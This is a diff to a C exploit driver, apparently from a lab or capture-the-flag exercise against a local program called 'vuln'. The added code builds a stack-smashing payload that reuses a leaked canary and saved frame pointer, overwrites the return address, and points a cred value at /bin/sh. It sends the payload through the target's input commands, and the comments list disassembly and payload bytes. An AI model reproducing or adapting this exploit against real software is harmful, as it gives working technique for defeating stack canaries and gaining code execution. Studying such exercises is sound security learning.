@@ -63,6 +63,47 @@ int main() {
     send();
     get_formatted("%*s");
 
+    unsigned explsz = auth_db_cred_dist + 8 - 8 + (4*8);
+    void* *expl = (void**)malloc(explsz);
+    memset((void*)expl, '90', explsz);
+
+    expl[explsz/sizeof(void*)-1] = (void*)curr_auth_cred + 9; // return address
+    expl[explsz/sizeof(void*)-2] = (void*)cur_auth_bp; // saved rbp value
+    expl[explsz/sizeof(void*)-3] = (void*)stack_canary; // canary
+    expl[explsz/sizeof(void*)-4] = (void*)curr_auth_cred; // cred
+    expl[explsz/sizeof(void*)-5] = (void*)cur_auth_cred_loc; // db
+    expl[1] = 0xdeadbeef;
+
+    put_str("u ");
+    put_bin((char*)expl, explsz);
+    put_str("\n");
+    send();
+    get_formatted("%*s");
+    put_str("l \n");
+    send();
+
+    usleep(100000);
+    get_formatted("%*s");
+
+    kill(pid, SIGINT);
+
+    int status;
+    wait(&status);
+
+    if (WIFEXITED(status)) {
+        fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
+    } 
+    else if (WIFSIGNALED(status)) {
+        printf("vuln killed by signal %d\n", WTERMSIG(status));
+    } 
+    else if (WIFSTOPPED(status)) {
+        printf("vuln stopped by signal %d\n", WSTOPSIG(status));
+    } 
+    else if (WIFCONTINUED(status)) {
+        printf("vuln continued\n");
+    }
+    
+    
 
     /*
      Disassembly of section .text:
@@ -81,6 +122,9 @@ int main() {
   40101e:	b8 ef be ad de       	mov    $0xdeadbeef,%eax
   401023:	ff e0                	jmpq   *%rax
 
+
+
+        bf7056341248bef0debc9a78
 
       */
 
@@ -101,8 +145,5 @@ rbp   <g's rbp>
                 NOP
       cred -> /bin/sh
 
-   */
-
-
- */
+*/
 
